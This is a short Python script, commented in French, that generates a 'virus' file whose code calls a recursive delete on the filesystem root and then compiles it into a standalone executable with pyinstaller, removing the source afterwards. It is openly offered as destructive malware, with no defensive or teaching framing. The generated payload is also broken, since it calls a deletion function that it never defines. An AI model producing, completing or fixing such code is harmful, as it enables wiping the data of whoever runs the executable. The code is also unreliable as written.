import os
import random
import string
import shutil
import time

# Fonction pour générer un nom de fichier aléatoire
def random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

# Fonction pour effacer des fichiers à des endroits donnés
def delete_files(path):
    try:
        if os.path.exists(path):
            shutil.rmtree(path)
            print(f"✅ Suppression réussie de : {path}")
    except Exception as e:
        print(f"⚠️ Erreur : {e}")

# Fonction pour lancer un virus
def create_virus():
    virus_code = """
import os
import time
print("💀 Lancement du virus, suppression en cours...")
time.sleep(2)
delete_files('/')  # Change ce chemin
time.sleep(2)
"""
    
    virus_file_name = f"virus_{random_string()}.py"
    
    with open(virus_file_name, 'w') as f:
        f.write(virus_code)

    print(f"📝 Fichier virus généré : {virus_file_name}")
    print("⏳ En train de le convertir en exécutable...")
    os.system(f'pyinstaller --onefile {virus_file_name}')  # Conversion en .exe

    print(f"✅ Le virus a été créé avec succès ! Chemin de sortie : ./dist/{virus_file_name.replace('.py', '.exe')}")
    os.remove(virus_file_name)  # On supprime le fichier source

if __name__ == "__main__":
    create_virus()
